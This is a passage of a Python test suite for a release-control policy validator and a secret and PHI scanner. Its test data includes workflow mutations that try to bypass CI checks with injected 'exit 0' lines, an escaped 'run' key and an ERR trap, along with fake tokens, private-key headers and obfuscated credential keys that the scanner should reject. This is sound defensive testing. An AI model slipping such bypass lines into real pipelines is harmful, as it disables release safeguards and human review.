                document["active"][relative] = hashlib.sha256(path.read_bytes()).hexdigest()
                self.write_trust_manifest(candidate, document)
                with self.assertRaisesRegex(
                    MODULE.PolicyError, "trusted-code transition|published snapshot"
                ):
                    MODULE.validate_transition(base, candidate)

    def test_active_trusted_code_rejects_executable_mode(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            target = root / "scripts" / "verify_release.py"
            target.chmod(0o755)
            with self.assertRaisesRegex(MODULE.PolicyError, "executable trusted-code"):
                MODULE.validate_trust_state(root)

    def test_exact_promotion_rejects_executable_active_mode(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            staged = self.copy_repository(str(Path(directory) / "staged"))
            self.stage_complete_bundle(staged)
            promoted = Path(directory) / "promoted" / "release-control"
            promoted.parent.mkdir()
            shutil.copytree(staged, promoted)
            self.promote_staged_bundle(promoted)
            (promoted / "scripts" / "verify_release.py").chmod(0o755)
            with self.assertRaisesRegex(MODULE.PolicyError, "executable trusted-code"):
                MODULE.validate_trusted_code_transition(staged, promoted)

    def test_simultaneous_stage_and_promote_and_partial_promotion_fail(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = self.copy_repository(str(Path(directory) / "base"))
            simultaneous = self.copy_repository(str(Path(directory) / "simultaneous"))
            self.stage_complete_bundle(simultaneous)
            self.promote_staged_bundle(simultaneous)
            with self.assertRaisesRegex(MODULE.PolicyError, "trusted-code transition"):
                MODULE.validate_trusted_code_transition(base, simultaneous)

            staged = self.copy_repository(str(Path(directory) / "staged"))
            self.stage_complete_bundle(staged)
            partial = Path(directory) / "partial" / "release-control"
            partial.parent.mkdir()
            shutil.copytree(staged, partial)
            document = self.load_trust_manifest(partial)
            first = sorted(MODULE.TRUSTED_CODE_PATHS)[0]
            (partial / first).write_bytes((partial / MODULE.STAGED_ROOT / first).read_bytes())
            document["active"][first] = document["staged"][first]
            self.write_trust_manifest(partial, document)
            with self.assertRaisesRegex(MODULE.PolicyError, "trusted-code transition"):
                MODULE.validate_trusted_code_transition(staged, partial)

    def test_malformed_unknown_traversal_and_incomplete_mappings_fail(self) -> None:
        variants = (
            lambda document: document.update({"unknown": True}),
            lambda document: document["active"].update({"../escape.py": "a" * 64}),
            lambda document: document["active"].update({"scripts/unknown.py": "a" * 64}),
            lambda document: document["active"].update({next(iter(document["active"])): "bad"}),
            lambda document: document["active"].pop(next(iter(document["active"]))),
        )
        for mutate in variants:
            with self.subTest(mutate=mutate), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                document = self.load_trust_manifest(root)
                mutate(document)
                self.write_trust_manifest(root, document)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.validate_trust_state(root)

    def test_staged_tree_rejects_symlink_extra_and_executable_files(self) -> None:
        for mutation in ("symlink", "extra", "executable"):
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.stage_complete_bundle(root)
                target = root / MODULE.STAGED_ROOT / sorted(MODULE.TRUSTED_CODE_PATHS)[0]
                if mutation == "symlink":
                    target.unlink()
                    target.symlink_to(root / sorted(MODULE.TRUSTED_CODE_PATHS)[0])
                elif mutation == "extra":
                    extra = root / MODULE.STAGED_ROOT / "scripts/extra.py"
                    extra.write_text("raise SystemExit(1)\n", encoding="utf-8")
                else:
                    target.chmod(0o755)
                with self.assertRaisesRegex(MODULE.PolicyError, "symlink|exactly|executable"):
                    MODULE.validate_trust_state(root)

    def test_rotation_process_and_direct_main_prohibition_are_documented(self) -> None:
        readme = (SOURCE_ROOT / "README.md").read_text(encoding="utf-8")
        bootstrap = (SOURCE_ROOT / "docs" / "bootstrap.md").read_text(
            encoding="utf-8"
        )
        for stage in ("**Stage:**", "**Promote:**", "**Cleanup:**"):
            self.assertIn(stage, readme)
        self.assertIn("A direct-main change", readme)
        self.assertIn("disable direct pushes to `main`", bootstrap)
        self.assertIn("`required_status_checks.strict: true`", bootstrap)
        self.assertIn("sole required check context", bootstrap)
        self.assertIn("exactly `validate-pull-request`", bootstrap)
        self.assertIn("app binding is GitHub Actions", bootstrap)
        self.assertIn("lineage-scoped authorization", readme)
        self.assertIn("not a globally one-time", readme)
        self.assertIn("new bootstrap", bootstrap)
        self.assertIn("temporary policy of zero required human", bootstrap)
        self.assertIn("pull-request approvals", bootstrap)
        self.assertIn("approval of the most recent push", bootstrap)
        self.assertIn("its author is not\nrequired", bootstrap)
        self.assertIn("target of two required approvals is deferred", bootstrap)
        validation = (
            SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
        ).read_text(encoding="utf-8")
        self.assertIn("pull_request_target:", validation)
        self.assertNotIn("\n  pull_request:\n", validation)

    def test_exact_byte_contract_rejects_parser_and_control_flow_bypasses(self) -> None:
        mutations = (
            (
                "deploy-approved-release.yml",
                "          set -euo pipefail\n"
                "          git ls-files --error-unmatch -- \\",
                "          set -euo pipefail\n"
                "          exit 0\n"
                "          git ls-files --error-unmatch -- \\",
            ),
            (
                "validate-control.yml",
                '        run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"',
                '        run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"\n'
                "        \"r\\u0075n\": exit 0",
            ),
            (
                "validate-control.yml",
                '        run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"',
                '        run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"\n'
                "        run: exit 0",
            ),
            (
                "deploy-approved-release.yml",
                "          set -euo pipefail\n"
                "          git ls-files --error-unmatch -- \\",
                "          set -euo pipefail; trap 'exit 0' ERR\n"
                "          git ls-files --error-unmatch -- \\",
            ),
        )
        for name, old, new in mutations:
            with (
                self.subTest(name=name, mutation=new),
                tempfile.TemporaryDirectory() as directory,
            ):
                root = self.copy_repository(directory)
                self.mutate_named_workflow(root, name, old, new)
                with self.assertRaisesRegex(
                    MODULE.PolicyError,
                    "trusted workflow byte digest|trusted-code byte digest|may execute only trusted verifier|finite command allowlist",
                ):
                    MODULE.validate_self_check(root)

    def test_application_source_and_unknown_root_file_fail(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            source = root / "src"
            source.mkdir()
            (source / "Patient.cs").write_text("public class Patient {}")
            with self.assertRaisesRegex(MODULE.PolicyError, "not allowlisted"):
                MODULE.validate_self_check(root)
            shutil.rmtree(source)
            (root / "notes.txt").write_text("internal")
            with self.assertRaisesRegex(MODULE.PolicyError, "not allowlisted"):
                MODULE.validate_self_check(root)

    def test_candidate_symlink_is_rejected_without_reading_and_oversized_file_fails(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            linked = root / "docs" / "linked.md"
            linked.symlink_to(root / "README.md")
            original_read_bytes = Path.read_bytes

            def reject_candidate_symlink_read(path: Path) -> bytes:
                if path == linked:
                    raise AssertionError("candidate symlink was dereferenced")
                return original_read_bytes(path)

            with (
                mock.patch.object(Path, "read_bytes", reject_candidate_symlink_read),
                self.assertRaisesRegex(MODULE.PolicyError, "symlink"),
            ):
                MODULE.validate_self_check(root)
            linked.unlink()
            (root / "docs" / "large.md").write_text(
                "x" * (MODULE.MAX_FILE_BYTES + 1)
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "size"):
                MODULE.validate_self_check(root)

    def test_secret_private_key_and_private_address_fail(self) -> None:
        payloads = (
            "gh" + "p_abcdefghijklmnopqrstuvwxyz123456",
            "-----BEGIN " + "PRIVATE KEY-----\nnot-a-real-key",
            "private target " + "10." + "2.3.4",
        )
        for index, payload in enumerate(payloads):
            with self.subTest(index=index), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                (root / "docs" / "leak.md").write_text(payload)
                with self.assertRaisesRegex(MODULE.PolicyError, "possible"):
                    MODULE.validate_self_check(root)

    def test_ordinary_files_reject_credential_and_synthetic_phi_aliases(self) -> None:
        assignments = (
            ("credential assignment", "DB_PASS" + 'WORD = "x"'),
            ("credential assignment", "serviceClient" + "Secret = x"),
            ("credential assignment", '"MY_API_' + 'KEY": "' + "x" * 4096 + '",'),
            ("credential assignment", "backup_access_" + "token: A_B # redacted badly"),
            ("synthetic PHI marker", "M" + 'RN: "A-1"'),
            ("synthetic PHI marker", "synthetic_patient_" + "id = A_1"),
            ("synthetic PHI marker", "sourcePatient" + 'Identifier: "ABC-123"'),
            ("synthetic PHI marker", "clinician" + "Id = c"),
            ("synthetic PHI marker", "clinic_facility_" + "id: f_1"),
            ("synthetic PHI marker", '"tenant' + 'Id": "tenant value",'),
            ("synthetic PHI marker", "app_user_" + "identifier = " + "U" * 4096),
            (
                "personal GitHub noreply identity",
                "123456+personal-login@users." + "noreply.github.com",
            ),
        )
        for label, payload in assignments:
            with self.subTest(
                label=label, payload=payload
            ), tempfile.TemporaryDirectory() as directory:
                root = Path(directory)
                target = root / "docs" / "ordinary.md"
                target.parent.mkdir()
                target.write_text(payload, encoding="utf-8")
                with self.assertRaisesRegex(
                    MODULE.PolicyError,
                    rf"possible {label} found in docs/ordinary\.md",
                ):
                    MODULE.scan_sensitive_content(root, MODULE.repository_files(root))

    def test_archive_scanner_rejects_the_same_assignment_and_identity_classes(self) -> None:
        payloads = (
            ("credential assignment", "DB_PASS" + 'WORD = "x"'),
            ("credential assignment", '"MY_API_' + 'KEY": "' + "x" * 4096 + '",'),
            ("credential assignment", "serviceClient" + "Secret = A_B"),
            ("synthetic PHI marker", "M" + "RN = A_B"),
            ("synthetic PHI marker", "synthetic_patient_" + "id: p"),
            ("synthetic PHI marker", "sourcePatient" + "Identifier = p_1"),
            ("synthetic PHI marker", "clinician" + "Id: c"),
            ("synthetic PHI marker", "clinic_facility_" + "id = f"),
            ("synthetic PHI marker", '"tenant_' + 'id": "t",'),
            ("synthetic PHI marker", "appUser" + "Identifier: " + "U" * 4096),
            (
                "personal GitHub noreply identity",
                "personal-login@users." + "noreply.github.com",
            ),
        )
        for label, payload in payloads:
            with self.subTest(label=label, payload=payload):
                with self.assertRaisesRegex(
                    MODULE.PolicyError,
                    rf"possible {label} found in published archive member: fixture\.md",
                ):
                    MODULE.scan_sensitive_bytes("fixture.md", payload.encode())

    def test_decoded_commit_bytes_use_the_same_sensitive_assignment_rules(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, _ = commit.partition(b"\n\n")
        self.assertTrue(separator)
        payloads = (
            ("credential assignment", "DB_PASS" + "WORD = commit-value"),
            ("synthetic PHI marker", "clinician" + 'Id: "commit-value"'),
            ("synthetic PHI marker", '"facility_' + 'id": "commit-value"'),
            ("synthetic PHI marker", "tenant" + "Identifier = commit_value"),
            ("synthetic PHI marker", "user_" + "id: " + "U" * 4096),
        )
        for label, payload in payloads:
            with self.subTest(label=label, payload=payload):
                candidate = headers + separator + payload.encode() + b"\n"
                with self.assertRaisesRegex(
                    MODULE.PolicyError,
                    rf"possible {label} found in published archive member: source commit",
                ):
                    MODULE.validate_published_commit_headers(candidate)

    def test_compact_mapping_and_export_assignment_parity_across_all_paths(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, _ = commit.partition(b"\n\n")
        self.assertTrue(separator)
        assignments = (
            (
                "credential assignment",
                '{"name":"safe","DB_PASS' + 'WORD":"json-value"}',
            ),
            (
                "synthetic PHI marker",
                '{"name":"safe","patient' + 'Id":"P-1"}',
            ),
            (
                "credential assignment",
                "{name: safe, client" + "Secret: yaml-value}",
            ),
            (
                "synthetic PHI marker",
                "{'name': 'safe', 'facility_" + "id': 'F-1'}",
            ),
            (
                "credential assignment",
                "export ACCESS_" + "TOKEN=shell-value",
            ),
            (
                "credential assignment",
                "SAFE=value DB_PASS" + "WORD=shell-value NEXT=value",
            ),
            (
                "synthetic PHI marker",
                "SAFE=value;tenant" + "Identifier=tenant-value;NEXT=value",
            ),
            (
                "credential assignment",
                '{\n  "client' + 'Secret"\n  :\n  "json-value"\n}',
            ),
            (
                "synthetic PHI marker",
                '{\n  "patient_' + 'id":\n  "P-1"\n}',
            ),
            (
                "credential assignment",
                "DB_PASS" + "WORD:\n  yaml-value",
            ),
            (
                "credential assignment",
                "serviceCLIENTSECRET: do not publish this value",
            ),
            (
                "credential assignment",
                "BACKUPApiKey=do not publish this value",
            ),
            (
                "credential assignment",
                "OIDCaccesstoken: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "canonicalPATIENTID: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "recordPATIENTIDENTIFIER: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "auditCLINICIANID: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "auditCLINICIANIDENTIFIER: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "homeFACILITYID: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "homeFACILITYIDENTIFIER: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "authTENANTID: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "authTENANTIDENTIFIER: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "actorUSERID: do not publish this value",
            ),
            (
                "synthetic PHI marker",
                "actorUSERIDENTIFIER: do not publish this value",
            ),
        )
        for label, payload in assignments:
            for path in ("ordinary", "archive", "decoded commit", "end-to-end"):
                with (
                    self.subTest(label=label, payload=payload, path=path),
                    tempfile.TemporaryDirectory() as directory,
                ):
                    if path == "ordinary":
                        root = Path(directory)
                        (root / "docs").mkdir()
                        (root / "docs" / "assignment-integration.md").write_text(
                            payload, encoding="utf-8"
                        )
                        action = lambda: MODULE.scan_sensitive_content(
                            root, MODULE.repository_files(root)
                        )
                    elif path == "archive":
                        root = self.copy_repository(directory)
                        mutated = self.load_fixture(root)
                        contents = MODULE.load_published_archive(mutated)
                        contents["README.md"] = payload.encode()
                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
                        self.write_fixture(root, mutated)
                        action = lambda: MODULE.load_published_fixture(root)
                    elif path == "decoded commit":
                        candidate = headers + separator + payload.encode() + b"\n"
                        action = lambda: MODULE.validate_published_commit_headers(candidate)
                    else:
                        root = self.copy_repository(directory)
                        (root / "docs" / "assignment-integration.md").write_text(
                            payload, encoding="utf-8"
                        )
                        action = lambda: MODULE.validate_self_check(root)
                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                        action()

        allowed = (
            '{"pass' + 'word":null,"patient' + 'Id":"string","name":"safe"}',
            "{client" + "Secret: none, facility_" + "id: str, name: safe}",
            "export API_" + "KEY=",
            "DB_PASS" + "WORD=<redacted>",
            "client" + "Secret: ${CLIENT_SECRET}",
            "serviceCLIENTSECRETARY: documented non-sensitive field",
            "BACKUPApiKeyNote: documented non-sensitive field",
            "OIDCaccesstokenPolicy: documented non-sensitive field",
            "canonicalPATIENTIDENTITY: documented non-sensitive field",
            "auditCLINICIANIDENTITY: documented non-sensitive field",
            "homeFACILITYIDENTIFIERNOTE: documented non-sensitive field",
            "authTENANTIDEA: documented non-sensitive field",
            "actorUSERIDEMPOTENCY: documented non-sensitive field",
        )
        for payload in allowed:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
                self.assertIsNone(MODULE.sensitive_content_label(payload))
                root = Path(directory)
                target = root / "docs" / "ordinary.md"
                target.parent.mkdir()
                target.write_text(payload, encoding="utf-8")
                MODULE.scan_sensitive_content(root, MODULE.repository_files(root))
                MODULE.scan_sensitive_bytes("safe.md", payload.encode())
                candidate = headers + separator + payload.encode() + b"\n"
                MODULE.validate_published_commit_headers(candidate)

        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "docs" / "safe-assignment-controls.md").write_text(
                "\n".join(allowed), encoding="utf-8"
            )
            MODULE.validate_self_check(root)

    def test_structural_sensitive_values_have_parity_across_all_paths(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, _ = commit.partition(b"\n\n")
        self.assertTrue(separator)
        payloads = (
            ("credential assignment", '{"pass\\u0077ord": {}}'),
            ("credential assignment", '{"client' + 'Secret": []}'),
            (
                "credential assignment",
                '{"access' + 'Token": [{"nested": ["value"]}]}',
            ),
            (
                "synthetic PHI marker",
                '{"outer": [{"patient' + 'Id": {"nested": [null]}}]}',
            ),
            ("credential assignment", "pass" + "word:\n  - item"),
            ("credential assignment", "client" + "Secret:\n  child: value"),
            (
                "synthetic PHI marker",
                "patient_" + "id:\n  child:\n    - item",
            ),
        )
        for label, payload in payloads:
            for path in ("ordinary", "archive", "decoded commit"):
                with (
                    self.subTest(label=label, payload=payload, path=path),
                    tempfile.TemporaryDirectory() as directory,
                ):
                    if path == "ordinary":
                        root = self.copy_repository(directory)
                        target = root / "docs" / "fixture.md"
                        target.write_text(payload, encoding="utf-8")
                        action = lambda: MODULE.validate_self_check(root)
                    elif path == "archive":
                        root = self.copy_repository(directory)
                        mutated = self.load_fixture(root)
                        contents = MODULE.load_published_archive(mutated)
                        contents["README.md"] = payload.encode()
                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
                        self.write_fixture(root, mutated)
                        action = lambda: MODULE.load_published_fixture(root)
                    else:
                        candidate = headers + separator + payload.encode() + b"\n"
                        action = lambda: MODULE.validate_published_commit_headers(candidate)
                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                        action()

    def test_embedded_json_and_escaped_keys_have_parity_across_all_paths(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, _ = commit.partition(b"\n\n")
        self.assertTrue(separator)
        payloads = (
            (
                "credential assignment",
                '- {"pass' + '\\u0077ord": {"nested": ["value"]}}',
            ),
            (
                "credential assignment",
                'content: prefix {"client' + '\\u0053ecret": ["value"]}',
            ),
            (
                "credential assignment",
                'markdown `[{"api' + '\\u004bey": "exposed"}]` suffix',
            ),
            (
                "credential assignment",
                'scalar: text {"access' + '\\u0054oken": "exposed"}',
            ),
            (
                "synthetic PHI marker",
                '- {"patient' + '\\u0049d": {"nested": true}}',
            ),
            (
                "synthetic PHI marker",
                'content: {"clinician' + '\\u0049d": "C-1"}',
            ),
            (
                "synthetic PHI marker",
                'scalar: prefix [{"facility'
                + '\\u0049dentifier": ["F-1"]}]',
            ),
            (
                "synthetic PHI marker",
                'content: {"tenant' + '\\u0049dentifier": "T-1"}',
            ),
            (
                "synthetic PHI marker",
                'content: {"user' + '\\u0049d": "U-1"}',
            ),
            (
                "synthetic PHI marker",
                'prose {"m' + '\\u0072n": "A-1"} suffix',
            ),
        )
        for label, payload in payloads:
            for path in ("ordinary", "archive", "decoded commit"):
                with (
                    self.subTest(label=label, payload=payload, path=path),
                    tempfile.TemporaryDirectory() as directory,
                ):
                    if path == "ordinary":
                        root = self.copy_repository(directory)
                        (root / "docs" / "embedded-json.md").write_text(
                            payload, encoding="utf-8"
                        )
                        action = lambda: MODULE.validate_self_check(root)
                    elif path == "archive":
                        root = self.copy_repository(directory)
                        mutated = self.load_fixture(root)
                        contents = MODULE.load_published_archive(mutated)
                        contents["README.md"] = payload.encode()
                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
                        self.write_fixture(root, mutated)
                        action = lambda: MODULE.load_published_fixture(root)
                    else:
                        candidate = headers + separator + payload.encode() + b"\n"
                        action = lambda: MODULE.validate_published_commit_headers(candidate)
                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                        action()

    def test_embedded_safe_json_placeholders_and_malformed_fragments_are_handled(self) -> None:
        safe_payloads = (
            '- docs: {"pass' + '\\u0077ord": "${PASSWORD}"}',
            'scalar: prefix [{"patient' + '\\u0049d": "string"}] suffix',
            'workflow: ${{ matrix.value }} and ${PLAIN_ENV}',
            'malformed: prefix {"safe": [} suffix',
            'malformed quoted key: {"pass' + '\\u00zzword": null}',
        )
        for payload in safe_payloads:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

        malformed_sensitive = '- {"pass' + '\\u0077ord": "exposed"'
        self.assertEqual(
            "credential assignment", MODULE.sensitive_content_label(malformed_sensitive)
        )

    def test_encoded_json_sensitive_keys_have_parity_across_all_paths(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, _ = commit.partition(b"\n\n")
        self.assertTrue(separator)
        keys = (
            ("credential assignment", "pass" + "word"),
            ("credential assignment", "client" + "Secret"),
            ("credential assignment", "api" + "Key"),
            ("credential assignment", "access" + "Token"),
            ("synthetic PHI marker", "patient" + "Id"),
            ("synthetic PHI marker", "patient" + "Identifier"),
            ("synthetic PHI marker", "clinician" + "Id"),
            ("synthetic PHI marker", "clinician" + "Identifier"),
            ("synthetic PHI marker", "facility" + "Id"),
            ("synthetic PHI marker", "facility" + "Identifier"),
            ("synthetic PHI marker", "tenant" + "Id"),
            ("synthetic PHI marker", "tenant" + "Identifier"),
            ("synthetic PHI marker", "user" + "Id"),
            ("synthetic PHI marker", "user" + "Identifier"),
            ("synthetic PHI marker", "m" + "rn"),
        )
        for label, key in keys:
            payload = json.dumps({"encoded": json.dumps({key: "exact-value"})})
            for path in ("ordinary", "archive", "decoded commit"):
                with (
                    self.subTest(label=label, key=key, path=path),
                    tempfile.TemporaryDirectory() as directory,
                ):
                    if path == "ordinary":
                        root = self.copy_repository(directory)
                        (root / "docs" / "encoded-json.md").write_text(
                            payload, encoding="utf-8"
                        )
                        action = lambda: MODULE.validate_self_check(root)
                    elif path == "archive":
                        root = self.copy_repository(directory)
                        mutated = self.load_fixture(root)
                        contents = MODULE.load_published_archive(mutated)
                        contents["README.md"] = payload.encode()
                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
                        self.write_fixture(root, mutated)
                        action = lambda: MODULE.load_published_fixture(root)
                    else:
                        candidate = headers + separator + payload.encode() + b"\n"
                        action = lambda: MODULE.validate_published_commit_headers(candidate)
                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                        action()

    def test_encoded_json_recurses_across_multiple_string_encodings(self) -> None:
        encoded: object = {"patient" + "Id": "P-1"}
        for _ in range(4):
            encoded = {"encoded": json.dumps(encoded)}
        self.assertEqual(
            "synthetic PHI marker",
            MODULE.sensitive_content_label(json.dumps(encoded)),
        )

    def test_complete_json_documents_and_encoded_top_level_strings_have_parity(self) -> None:
        payload = json.dumps(
            json.dumps({"namespace:patient:" + "id": "SYNTHETIC-VALUE-123"})
        )
        self.assert_sensitive_payload_parity(payload, "synthetic PHI marker")

        for safe_document in ("null", "true", "42", '"plain text"'):
            with self.subTest(safe_document=safe_document):
                self.assertIsNone(MODULE.sensitive_content_label(safe_document))

        with mock.patch.object(MODULE, "MAX_JSON_NODES", 0):
            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
                MODULE.sensitive_content_label("true")

    def test_encoded_json_uses_shared_candidate_depth_node_and_byte_budgets(self) -> None:
        nested = json.dumps({"encoded": json.dumps({"safe": True})})
        with mock.patch.object(MODULE, "MAX_JSON_CANDIDATES", 1):
            with self.assertRaisesRegex(MODULE.PolicyError, "candidate bound"):
                MODULE.sensitive_content_label(nested)
        with mock.patch.object(MODULE, "MAX_JSON_DEPTH", 1):
            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
                MODULE.sensitive_content_label(nested)
        with mock.patch.object(MODULE, "MAX_JSON_NODES", 2):
            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
                MODULE.sensitive_content_label(nested)
        with mock.patch.object(MODULE, "MAX_JSON_BYTES", len(nested.encode("utf-8"))):
            with self.assertRaisesRegex(MODULE.PolicyError, "byte bound"):
                MODULE.sensitive_content_label(nested)

    def test_safe_json_like_strings_and_malformed_prose_are_not_recursively_scanned(self) -> None:
        payloads = (
            {"example": '{"pass' + 'word": null}'},
            {"example": '[{"patient' + 'Id": "string"}]'},
            {"example": '{"pass' + 'word": "${PASSWORD}"}'},
            {"example": "{not actually JSON prose with patient" + "Id: P-1}"},
            {"example": '{"pass' + 'word": "unterminated"'},
            {"example": "[not JSON prose mentioning patient" + "Id]"},
            {"example": '{"safe": true} trailing prose patient' + "Id: P-1"},
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(json.dumps(payload)))

    def test_markdown_external_values_and_colon_delimited_keys_have_parity(self) -> None:
        payloads = (
            ("- **db:pass" + "word:** exact-value", "credential assignment"),
            ("1. `namespace:patient:" + "id:` P-123", "synthetic PHI marker"),
            ("> __client " + "secret:__ exact-value", "credential assignment"),
            ('{"db:pass' + 'word":"exact-value"}', "credential assignment"),
            ("namespace:patient:" + "id: P-123", "synthetic PHI marker"),
        )
        for payload, label in payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

    def test_markdown_and_colon_delimited_key_controls_remain_safe(self) -> None:
        payloads = (
            "Use **Patient ID:** as the documented field label.",
            "- **db:pass" + "word:** ${DB_PASSWORD}",
            "2) `namespace:patient:" + "id:` string",
            "service:endpoint: https://example.invalid/path",
            "namespace:safe:key: exact-value",
            '{"namespace:patient:' + 'id":"string"}',
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

    def test_empty_sensitive_placeholders_without_structural_children_are_safe(self) -> None:
        payloads = (
            "pass" + "word:\n",
            "client" + "Secret:\n  # intentionally empty\n",
            "patient_" + "id:\nnext: value\n",
            '{"pass\\u0077ord": null, "patient' + 'Id": "string"}',
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

    def test_yaml_scalar_continuations_have_parity_and_cover_all_sensitive_classes(self) -> None:
        exact_payloads = (
            ("pass" + "word: # supplied below\n\n  exact-value", "credential assignment"),
            ("client" + "Secret:\n  # supplied below\n\n  \"quoted-value\"", "credential assignment"),
            ("patient_" + "id: # supplied below\n\n  'P-123'", "synthetic PHI marker"),
        )
        for payload, label in exact_payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

        sensitive_keys = (
            ("password", "credential assignment"),
            ("clientSecret", "credential assignment"),
            ("apiKey", "credential assignment"),
            ("accessToken", "credential assignment"),
            ("patientId", "synthetic PHI marker"),
            ("patientIdentifier", "synthetic PHI marker"),
            ("clinicianId", "synthetic PHI marker"),
            ("clinicianIdentifier", "synthetic PHI marker"),
            ("facilityId", "synthetic PHI marker"),
            ("facilityIdentifier", "synthetic PHI marker"),
            ("tenantId", "synthetic PHI marker"),
            ("tenantIdentifier", "synthetic PHI marker"),
            ("userId", "synthetic PHI marker"),
            ("userIdentifier", "synthetic PHI marker"),
            ("mrn", "synthetic PHI marker"),
        )
        for key, label in sensitive_keys:
            payload = f"{key}: # continuation\n\n  'exact-value'"
            with self.subTest(key=key):
                self.assertEqual(label, MODULE.sensitive_content_label(payload))

        controls = (
            "pass" + "word: # intentionally empty\n\n",
            "client" + "Secret:\n  # runtime value only\n",
            "api" + "Key: # placeholder below\n\n  <redacted>",
            "patient" + "Id:\n  \"${PATIENT_ID}\"",
        )
        for payload in controls:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

    def test_spaced_and_quoted_yaml_continuations_share_sensitive_key_parity(self) -> None:
        parity_payloads = (
            ("API key: # supplied below\n  exact-value", "credential assignment"),
            ("'client secret':\n  \"quoted-value\"", "credential assignment"),
            ('"Patient ID":\n  P-123', "synthetic PHI marker"),
        )
        for payload, label in parity_payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

        sensitive_keys = (
            ("password", "credential assignment"),
            ("client secret", "credential assignment"),
            ("API key", "credential assignment"),
            ("access token", "credential assignment"),
            ("Patient ID", "synthetic PHI marker"),
            ("Patient identifier", "synthetic PHI marker"),
            ("Clinician ID", "synthetic PHI marker"),
            ("Clinician identifier", "synthetic PHI marker"),
            ("Facility ID", "synthetic PHI marker"),
            ("Facility identifier", "synthetic PHI marker"),
            ("Tenant ID", "synthetic PHI marker"),
            ("Tenant identifier", "synthetic PHI marker"),
            ("User ID", "synthetic PHI marker"),
            ("User identifier", "synthetic PHI marker"),
            ("MRN", "synthetic PHI marker"),
        )
        key_renderers = (
            lambda key: key,
            lambda key: f"'{key}'",
            lambda key: json.dumps(key),
        )
        for index, (key, label) in enumerate(sensitive_keys):
            rendered_key = key_renderers[index % len(key_renderers)](key)
            payload = f"{rendered_key}: # continuation\n\n  exact-value"
            with self.subTest(key=key, rendered_key=rendered_key):
                self.assertEqual(label, MODULE.sensitive_content_label(payload))

        controls = (
            "API key: # intentionally empty\n\n",
            "'client secret':\n  # runtime value only\n",
            '"Patient ID":\n  <redacted>',
            "Facility identifier:\n  ${FACILITY_ID}",
        )
        for payload in controls:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

    def test_prefixed_spaced_keys_have_same_line_and_continuation_parity(self) -> None:
        sensitive_keys = (
            ("database password", "credential assignment"),
            ("service client secret", "credential assignment"),
            ("DB API key", "credential assignment"),
            ("OIDC access token", "credential assignment"),
            ("source Patient ID", "synthetic PHI marker"),
            ("source Patient identifier", "synthetic PHI marker"),
            ("audit Clinician ID", "synthetic PHI marker"),
